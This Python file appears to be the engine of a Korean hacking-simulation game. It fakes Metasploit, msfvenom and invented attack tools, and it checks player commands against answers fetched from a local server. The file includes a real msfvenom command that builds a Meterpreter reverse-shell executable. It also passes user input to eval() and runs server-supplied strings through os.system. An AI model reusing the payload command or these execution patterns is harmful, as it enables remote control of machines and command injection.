from random import *
import os, json
import requests
import ast

lis = ast.literal_eval(json.loads(requests.get('http://localhost:8000/api/cmd').content.decode()))
tipl = ast.literal_eval(json.loads(requests.get('http://localhost:8000/api/tip').content.decode()))
nTip = ast.literal_eval(json.loads(requests.get('http://localhost:8000/api/new_tip').content.decode()))

def semStep(step: int):
	semStep = [0,2,2,1,2,3,1,0]
	return semStep[step]

def ipconfig(src: str):
	return('''Windows IP 구성

이더넷 어댑터 이더넷:

   연결별 DNS 접미사. . . . : 
   링크-로컬 IPv6 주소 . . . . : fe80::99ff:aae8:27e0:d6bd%16
   IPv4 주소 . . . . . . . . . : 144.13.135.13
   서브넷 마스크 . . . . . . . : 255.255.255.0
   기본 게이트웨이 . . . . . . : 144.13.135.255

무선 LAN 어댑터 Wi-Fi:

   미디어 상태 . . . . . . . . : 미디어 연결 끊김
   연결별 DNS 접미사. . . . : \n''')

def man(src: str):
	src = src[0]
	if src == 'msfvenom':
		return '''back          Move back from the current context
banner        Display an awesome metasploit banner
cd            Change the current working directory
color         Toggle color
connect       Communicate with a host
edit          Edit the current module with $VISUAL or $EDITOR
exit          Exit the console
get           Gets the value of a context-specific variable
getg          Gets the value of a global variable
go_pro        Launch Metasploit web GUI
grep          Grep the output of another command
help          Help menu
info          Displays information about one or more module
irb           Drop into irb scripting mode
jobs          Displays and manages jobs
kill          Kill a job
load          Load a framework plugin
loadpath      Searches for and loads modules from a path
makerc        Save commands entered since start to a file
popm          Pops the latest module off the stack and makes it active
previous      Sets the previously loaded module as the current module
pushm         Pushes the active or list of modules onto the module stack
quit          Exit the console
reload_all    Reloads all modules from all defined module paths
rename_job    Rename a job
resource      Run the commands stored in a file
route         Route traffic through a session
save          Saves the active datastores
search        Searches module names and descriptions
sessions      Dump session listings and display information about sessions
set           Sets a context-specific variable to a value
setg          Sets a global variable to a value
show          Displays modules of a given type, or all modules
sleep         Do nothing for the specified number of seconds
spool         Write console output into a file as well the screen
threads       View and manipulate background threads
unload        Unload a framework plugin
unset         Unsets one or more context-specific variables
unsetg        Unsets one or more global variables
use           Selects a module by name
version       Show the framework and console library version numbers
'''
	elif src=='msfconsole':
		return '''Usage: msfconsole [options]
Common options
	-E, --environment ENVIRONMENT	The Rails environment. Will use RAIL_ENV environment variavle if that is set. Defaul neither option not RAIL_ENV environment variable is set.

Database options
	-M, --migration-path DIRECTORY	Specify a directory containing additional DB migrations
	-n,  --no-database			Disable database support
	-y,  --no yaml PATH		Specify a YAML file containing database settings

Framework options
	-c FILE				Load the specified configuration file
	-v,  --version			Show version

Module option
	     --defer-module-loads		Defer module loading unless explicitly asked.
	-m, --module-path DIRECTORY	An additional module path

Console options:
	-a,  --ask				Ask before exiting Metasploit or accept 'exit -y'
	-d,  --defanged			Execute the console as defanged
	-L,  --real-readline			Use the system Readling library instead of RbReadline
	-o,  --output FILE			Output to the specified file
	-p,  --plugin PLUGIN		Load a plugin on startup
	-q,  --quiet			Do not print the banner on startup
	-r,  --resource FILE			Execute the specified resource file (- for stdin)
	-x,  --execute-command COMMAND	Execute the specified string as console commands (use ; for multiples)
	-h, --help				Show this message
	'''
	elif src=='get-cam':
		return '''Usage of Get-Cam
get-cam --ip asdf --port asdf --sys windows10/64 --hw samsung'''
	elif src=='cellbroad-attack':
		return '''Usage: cellbroad-attack [URL]
Example: cellbroad-attack http://sv.m03.pw/video/03.mp4'''
	else:
		return 'NO'

def msfvenom(src: str):
	src = ' '.join(src)
	if src=='-p windows/meterpreter/reverse_tcp LHOST=144.13.135.13 LPORT=2031 -f exe > back.exe':
		print('File Created')
		f = open('hack.exe', 'w')
		f.write('KeKeKe')
		f.close()
		return '''No platform was selected, choosing Msf: : m=Modoul: : Platform: :Windows from the paload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333bytes
Final size of exe file: 73802 bytes'''

def msf(src: str):
	return '''payload => windows/meterpreter/reverse_tcp(노란색)
lhost => 144.168.0.22
lport => 2031
ExitONsession => false'''

def cellbroad_attack(src: str):
	num = src[0]
	del(src[0])
	src = ' '.join(src)
	return f'''[*] Broadcasting SMS Signal to cell system
[*] Sending message {src} to Near Signal
[*] CBS Initalizing'''

def result(cmd: str):
	flag = cmd.split(' ')
	app = flag[0]
	del(flag[0])
	if not app in globals().keys():
		result = 'Unknown Command. Check if installed or spelling.\n'
	else:
		print(app + f'({flag})')
		if flag == []: 
			print('EmptyFlag')
			flag = ['']
		result = eval(app+f'({flag})')
	return(result)

def show_ans(src: str):
	return '% Answer on mainText %\n'

def tip(step: int):
	if 'sys:run ' in tipl[step]:
		os.system(tipl[step].replace('sys:run ',''))
	return(tipl[step])

def newTip(step: int, count: int):
	print(step, count)
	if count == semStep(step):
		return '다음 단계로 넘어가자'
	newTip = nTip[step][count]
	if 'sys:run ' in newTip:
		os.system(newTip.replace('sys:run ',''))
	return newTip

def isCorrect(cmd: str, step: int, count: int, windows=None):
	print(cmd, step, count)
	if windows != None:
		if cmd == 'show_ans':
			windows.mainText.append(lis[step][count])
	if lis[step][count] == cmd:
		print(True)
		return True

if __name__ == "__main__":
	print(lis)
	print(tipl)
	print(nTip)